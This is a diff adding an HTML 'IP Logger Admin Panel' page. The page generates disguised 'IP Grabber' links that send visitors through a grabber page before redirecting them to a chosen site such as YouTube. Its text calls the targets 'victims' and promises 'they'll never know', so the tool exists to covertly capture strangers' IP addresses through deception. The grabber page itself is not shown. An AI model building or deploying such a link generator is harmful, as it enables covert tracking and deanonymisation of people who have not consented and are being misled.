@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger Admin</title>
+    <style>
+        body { background: #1a1a2e; color: #eee; font-family: Arial; text-align: center; padding: 50px; }
+        input, button { padding: 12px; margin: 10px; border: none; border-radius: 5px; }
+        input { width: 60%; background: #16213e; color: #fff; }
+        button { background: #e94560; color: #fff; cursor: pointer; font-weight: bold; }
+        button:hover { background: #c73b54; }
+        .embed { background: #2d2d44; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto; }
+    </style>
+</head>
+<body>
+    <h1>🔒 IP Logger Admin Panel</h1>
+    <p>Enter the URL you want to redirect victims to (they'll never know):</p>
+    <input type="text" id="targetUrl" placeholder="https://example.com" value="https://www.youtube.com">
+    <br>
+    <button onclick="generateLink()">⚡ Generate IP Grabber Link</button>
+    <div class="embed" id="result" style="display:none;">
+        <h3>📎 Your IP Grabber Link:</h3>
+        <p><input type="text" id="grabberLink" readonly style="width:80%; background:#1a1a2e;"></p>
+        <button onclick="copyLink()">📋 Copy Link</button>
+    </div>
+
+    <script>
+        function generateLink() {
+            const target = document.getElementById('targetUrl').value || 'https://www.youtube.com';
+            const base = window.location.origin + '/REPO_NAME/grabber.html?redirect=' + encodeURIComponent(target);
+            document.getElementById('grabberLink').value = base;
+            document.getElementById('result').style.display = 'block';
+        }
+        function copyLink() {
+            const link = document.getElementById('grabberLink');
+            link.select();
+            document.execCommand('copy');
+            alert('Link copied!');
+        }
+    </script>
+</body>
+</html>
